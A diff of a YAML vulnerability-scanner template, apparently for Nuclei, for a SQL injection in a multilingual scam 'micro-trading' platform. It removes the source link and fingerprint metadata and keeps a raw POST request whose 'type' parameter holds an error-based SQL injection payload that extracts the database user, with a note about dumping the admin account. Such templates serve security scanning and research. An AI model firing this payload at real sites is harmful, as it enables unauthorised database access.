@@ -3,12 +3,8 @@ info:
   name: 八国语言微盘杀猪盘诈骗微盘存在前台SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/kymg4p2xk4ipyd1l'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: kymg4p2xk4ipyd1l
-    fofa: '"/static/wap/css/common.css"'
 http:
 - raw:
   - 'POST /index/user/dorecharge HTTP/1.1
@@ -42,7 +38,6 @@ http:
 
     type=GTID_SUBSET(CONCAT((SELECT (USER()))),2235)&money=1222
 
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1755944196679-713bdbd0-33c7-43a7-8956-63c94c28bd52.png)
 
     **跑出管理员账户：**'
   redirects: false
